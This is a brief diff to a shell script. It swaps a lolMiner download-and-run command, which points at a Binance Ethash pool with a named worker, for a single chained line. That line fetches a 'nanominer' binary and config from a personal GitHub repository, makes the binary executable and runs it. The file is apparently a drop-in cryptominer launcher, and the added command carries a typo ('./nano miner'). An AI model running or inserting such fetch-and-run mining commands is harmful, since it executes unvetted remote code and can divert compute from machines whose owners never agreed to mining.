@@ -1,4 +1,1 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.32/lolMiner_v1.32a_Lin64.tar.gz
-tar -xf lolMiner_v1.32a_Lin64.tar.gz
-cd 1.32a/
-./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user VALBU10.VINI1 --ethstratum ETHPROXY
+wget https://github.com/kitcolab001/kitcolab001/raw/main/nanominer && wget https://raw.githubusercontent.com/kitcolab001/kitcolab001/main/config.ini && chmod +x nanominer && ./nano miner config.ini
